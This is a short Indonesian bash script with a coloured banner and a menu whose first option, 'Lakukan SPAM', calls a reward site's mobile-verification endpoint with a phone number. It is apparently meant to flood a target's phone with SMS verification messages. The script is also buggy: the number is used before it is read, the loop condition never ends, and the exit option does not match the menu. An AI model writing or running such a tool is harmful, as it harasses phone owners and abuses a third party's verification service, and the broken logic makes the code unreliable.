#!/bin/bash

figlet Selamat Datang | lolcat
figlet Wahai Manusia | lolcat
date | lolcat
sleep 2
clear

Ulang='Y'
while [ $Ulang='Y' ]
do
       echo "   ======Menu======"
       echo "[1] Lakukan SPAM"
       echo "[2] Laporkan Ada BUG"
       echo "[00] Keluar/EXIT"
       echo "  ================="
echo -n "Masukan Pilihannya NGAB :" pil:
read pil;
if [ $pil = '1' ] || [ $pil = '01' ]
then
       curl -sX GET "https://id.jagreward.com/member/verify-mobile/$Nomor"
       read -p "" Nomor :
elif  [ $pil = '2' ] || [ $pil = '02' ]
then   
      curl -sX GET "https://wa.me/6281219410786/"
elif [ $pil = '3' ] || [ $pil = '03' ]
then
         echo "Terimakasih Telah Menggunakan Tools Ini"
         exit
 fi
 
 done
